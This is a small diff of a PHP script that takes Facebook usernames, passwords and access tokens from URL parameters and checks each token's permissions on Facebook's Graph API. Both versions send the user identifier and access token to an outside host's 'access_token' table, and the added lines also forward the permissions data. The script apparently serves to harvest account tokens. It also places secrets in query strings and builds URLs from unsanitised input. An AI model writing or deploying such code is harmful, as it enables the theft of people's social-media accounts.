@@ -50,8 +50,11 @@ echo json_encode(array("data"=>Json(getLoginUrl($_GET["user"],$_GET["pass"])),"u
   if(!isset($_GET["check"])){  
 echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"])); 
   }else{
-echo json_encode(array("data"=>Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"])); 
- Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["user"].",".$_GET["token"]);
+      $data = Json("https://graph.facebook.com/me/permissions?access_token=".$_GET["token"])["data"];
+echo json_encode(array("data"=>$data)); 
+      
+ Json("https://app.restoviebelle.com/json.php?table=access_token&data=".$data."&set=number,token&val=".$_GET["user"].",".$_GET["token"]);
+  
   }
   }
 ?>
